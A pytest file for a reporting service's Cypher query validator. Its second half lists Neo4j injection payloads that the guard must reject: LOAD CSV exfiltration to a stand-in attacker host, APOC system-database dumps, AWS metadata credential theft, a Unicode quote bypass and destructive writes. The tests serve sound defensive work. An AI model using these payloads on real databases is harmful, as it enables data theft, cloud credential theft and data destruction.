import pytest

from reporting.services.query_validator import _check_read_only
from reporting.services.query_validator import QueryValidationError
from reporting.services.query_validator import validate_query


def test_validate_query_success(mocker):
    mocker.patch(
        "reporting.services.query_validator.SyntaxValidator"
    ).return_value.validate.return_value = (True, [])
    mocker.patch("reporting.services.query_validator._get_neo4j_client")
    mocker.patch(
        "reporting.services.query_validator.SchemaValidator"
    ).return_value.validate.return_value = (True, [])
    mocker.patch(
        "reporting.services.query_validator.PropertiesValidator"
    ).return_value.validate.return_value = (True, [])

    validate_query("MATCH (n) RETURN n")


def test_validate_query_syntax_error(mocker):
    mocker.patch(
        "reporting.services.query_validator.SyntaxValidator"
    ).return_value.validate.return_value = (
        False,
        [{"code": "SyntaxError", "description": "Syntax error at position 5"}],
    )
    mocker.patch("reporting.services.query_validator._get_neo4j_client")

    with pytest.raises(QueryValidationError) as exc_info:
        validate_query("MATC (n) RETURN n")
    assert len(exc_info.value.errors) == 1
    assert "Syntax error" in exc_info.value.errors[0]["description"]


def test_validate_query_schema_error(mocker):
    mocker.patch(
        "reporting.services.query_validator.SyntaxValidator"
    ).return_value.validate.return_value = (True, [])
    mocker.patch("reporting.services.query_validator._get_neo4j_client")
    mocker.patch(
        "reporting.services.query_validator.SchemaValidator"
    ).return_value.validate.return_value = (
        False,
        [{"code": "SchemaError", "description": "Unknown label: Foo"}],
    )
    mocker.patch(
        "reporting.services.query_validator.PropertiesValidator"
    ).return_value.validate.return_value = (True, [])

    with pytest.raises(QueryValidationError) as exc_info:
        validate_query("MATCH (n:Foo) RETURN n")
    assert len(exc_info.value.errors) == 1
    assert "Unknown label" in exc_info.value.errors[0]["description"]


def test_validate_query_properties_error(mocker):
    mocker.patch(
        "reporting.services.query_validator.SyntaxValidator"
    ).return_value.validate.return_value = (True, [])
    mocker.patch("reporting.services.query_validator._get_neo4j_client")
    mocker.patch(
        "reporting.services.query_validator.SchemaValidator"
    ).return_value.validate.return_value = (True, [])
    mocker.patch(
        "reporting.services.query_validator.PropertiesValidator"
    ).return_value.validate.return_value = (
        False,
        [{"code": "PropertiesError", "description": "Unknown property: bar"}],
    )

    with pytest.raises(QueryValidationError) as exc_info:
        validate_query("MATCH (n) WHERE n.bar = 1 RETURN n")
    assert len(exc_info.value.errors) == 1
    assert "Unknown property" in exc_info.value.errors[0]["description"]


def test_validate_query_multiple_errors(mocker):
    mocker.patch(
        "reporting.services.query_validator.SyntaxValidator"
    ).return_value.validate.return_value = (True, [])
    mocker.patch("reporting.services.query_validator._get_neo4j_client")
    mocker.patch(
        "reporting.services.query_validator.SchemaValidator"
    ).return_value.validate.return_value = (
        False,
        [{"code": "SchemaError", "description": "Schema error 1"}],
    )
    mocker.patch(
        "reporting.services.query_validator.PropertiesValidator"
    ).return_value.validate.return_value = (
        False,
        [{"code": "PropertiesError", "description": "Properties error 1"}],
    )

    with pytest.raises(QueryValidationError) as exc_info:
        validate_query("MATCH (n:Foo) WHERE n.bar = 1 RETURN n")
    assert len(exc_info.value.errors) == 2


def test_validate_query_write_rejected(mocker):
    mocker.patch(
        "reporting.services.query_validator.SyntaxValidator"
    ).return_value.validate.return_value = (True, [])
    mocker.patch("reporting.services.query_validator._get_neo4j_client")

    with pytest.raises(QueryValidationError):
        validate_query("CREATE (n:Person {name: 'Alice'}) RETURN n")


# --- Unit tests for _check_read_only (cypher-guard) ---


def test_check_read_only_allows_match():
    _check_read_only("MATCH (n) RETURN n")


def test_check_read_only_allows_optional_match():
    _check_read_only("OPTIONAL MATCH (n)-[r]->(m) RETURN n, r, m")


def test_check_read_only_allows_match_with_where():
    _check_read_only("MATCH (n) WHERE n.name = 'x' RETURN n")


def test_check_read_only_rejects_unsupported_clauses():
    """cypher-guard rejects queries with clauses it doesn't support (e.g. LIMIT),
    which is the safe behavior for a whitelist approach."""
    with pytest.raises(QueryValidationError):
        _check_read_only("MATCH (n) RETURN n LIMIT 10")


def test_check_read_only_allows_unwind():
    _check_read_only("UNWIND [1, 2, 3] AS x RETURN x")


def test_check_read_only_rejects_create():
    with pytest.raises(QueryValidationError):
        _check_read_only("CREATE (n:Person {name: 'Alice'})")


def test_check_read_only_rejects_merge():
    with pytest.raises(QueryValidationError):
        _check_read_only("MERGE (n:Person {name: 'Alice'}) RETURN n")


def test_check_read_only_rejects_delete():
    """DELETE fails to parse in cypher-guard, which is treated as a rejection."""
    with pytest.raises(QueryValidationError):
        _check_read_only("MATCH (n) DELETE n")


def test_check_read_only_rejects_set():
    """SET fails to parse in cypher-guard, which is treated as a rejection."""
    with pytest.raises(QueryValidationError):
        _check_read_only("MATCH (n) SET n.name = 'Bob' RETURN n")


# --- Neo4jection attack vector tests (from Varonis research) ---
# Reference: https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits


class TestNeo4jectionStringInjection:
    """Injection payloads that attempt to break out of string comparisons."""

    def test_or_true_with_clause_breakout(self):
        with pytest.raises(QueryValidationError):
            _check_read_only(
                "' OR 1=1 WITH 0 as _l00 CALL db.labels() yield label "
                "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
            )

    def test_property_filter_breakout(self):
        with pytest.raises(QueryValidationError):
            _check_read_only(
                "'=' LOAD CSV FROM 'http://attacker/' as l "
                "WITH 0 as _l00 RETURN 1 //"
            )


class TestNeo4jectionUnionInjection:
    """UNION-based injection to append attacker-controlled queries."""

    def test_node_property_union_breakout(self):
        with pytest.raises(QueryValidationError):
            _check_read_only(
                "'}) RETURN 1 UNION MATCH (n) "
                "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
            )

    def test_label_union_breakout(self):
        with pytest.raises(QueryValidationError):
            _check_read_only(
                "a) RETURN 1 UNION MATCH (n) "
                "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
            )

    def test_relationship_union_breakout(self):
        with pytest.raises(QueryValidationError):
            _check_read_only(
                "'}]-() RETURN 1 UNION MATCH (n) "
                "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
            )


class TestNeo4jectionDataExfiltration:
    """LOAD CSV-based data exfiltration attacks."""

    def test_label_enumeration_via_load_csv(self):
        with pytest.raises(QueryValidationError):
            _check_read_only(
                "'}) RETURN 0 as _0 UNION CALL db.labels() yield label "
                "LOAD CSV FROM 'http://attacker/?l='+label as l RETURN 0 as _0"
            )

    def test_property_extraction_via_load_csv(self):
        with pytest.raises(QueryValidationError):
            _check_read_only(
                "' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p "
                "LOAD CSV FROM 'http://attacker/?'+p+'='+toString(f[p]) as l "
                "RETURN 0 as _0 //"
            )

    def test_json_exfiltration_via_load_csv(self):
        with pytest.raises(QueryValidationError):
            _check_read_only(
                "' OR 1=1 WITH 0 as _0 MATCH (n) "
                "LOAD CSV FROM 'http://attacker/?json='+apoc.convert.toJson(n) as l "
                "RETURN 0 as _0 //"
            )

    def test_load_csv_standalone(self):
        with pytest.raises(QueryValidationError):
            _check_read_only("LOAD CSV FROM 'http://attacker/data' AS row RETURN row")


class TestNeo4jectionAPOCExploits:
    """Attacks using APOC procedures for system access."""

    def test_systemdb_graph_exfiltration(self):
        with pytest.raises(QueryValidationError):
            _check_read_only(
                "' OR 1=1 WITH 1 as a CALL apoc.systemdb.graph() yield nodes "
                "LOAD CSV FROM 'http://attacker/?nodes='+apoc.convert.toJson(nodes) "
                "as l RETURN 1 //"
            )

    def test_procedure_enumeration_neo4j4(self):
        with pytest.raises(QueryValidationError):
            _check_read_only(
                "' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name "
                "LOAD CSV FROM 'http://attacker/'+name as _l RETURN 1 //"
            )

    def test_apoc_cypher_run_bypass(self):
        with pytest.raises(QueryValidationError):
            _check_read_only(
                "' OR 1=1 WITH apoc.cypher.runFirstColumnMany("
                '"SHOW FUNCTIONS YIELD name RETURN name",{}) as names '
                "UNWIND names AS name "
                "LOAD CSV FROM 'http://attacker/'+name as _l RETURN 1 //"
            )


class TestNeo4jectionCloudMetadata:
    """Cloud metadata SSRF attacks via LOAD CSV / APOC."""

    def test_aws_imdsv1_credential_theft(self):
        with pytest.raises(QueryValidationError):
            _check_read_only(
                "LOAD CSV FROM "
                "'http://169.254.169.254/latest/meta-data/iam/security-credentials/' "
                "AS roles UNWIND roles AS role "
                "LOAD CSV FROM "
                "'http://169.254.169.254/latest/meta-data/iam/security-credentials/'"
                "+role as l RETURN l"
            )

    def test_aws_imdsv2_token_via_apoc(self):
        with pytest.raises(QueryValidationError):
            _check_read_only(
                "CALL apoc.load.csvParams("
                '"http://169.254.169.254/latest/api/token", '
                '{method: "PUT",`X-aws-ec2-metadata-token-ttl-seconds`:21600},'
                '"",{header:FALSE}) yield list '
                "WITH list[0] as token RETURN token"
            )


class TestNeo4jectionUnicodeBypass:
    """Unicode escape sequences used to evade quote filtering."""

    def test_unicode_quote_escape(self):
        with pytest.raises(QueryValidationError):
            _check_read_only(
                "\u0027}) RETURN 0 as _0 UNION CALL db.labels() yield label "
                'LOAD CSV FROM "http://attacker/"+label RETURN 0 as _o //'
            )


class TestNeo4jectionWriteClauses:
    """Direct write clause injection attempts."""

    def test_create_node_injection(self):
        with pytest.raises(QueryValidationError):
            _check_read_only(
                "MATCH (n) RETURN n UNION CREATE (evil:Backdoor {cmd: 'whoami'})"
            )

    def test_merge_with_on_create(self):
        with pytest.raises(QueryValidationError):
            _check_read_only(
                "MERGE (n:Admin {name: 'attacker'}) "
                "ON CREATE SET n.role = 'superadmin' RETURN n"
            )

    def test_detach_delete_all(self):
        with pytest.raises(QueryValidationError):
            _check_read_only("MATCH (n) DETACH DELETE n")

    def test_foreach_write(self):
        with pytest.raises(QueryValidationError):
            _check_read_only(
                "MATCH (n) WITH collect(n) as nodes "
                "FOREACH (x IN nodes | SET x.pwned = true)"
            )

    def test_remove_labels(self):
        with pytest.raises(QueryValidationError):
            _check_read_only("MATCH (n:Admin) REMOVE n:Admin RETURN n")
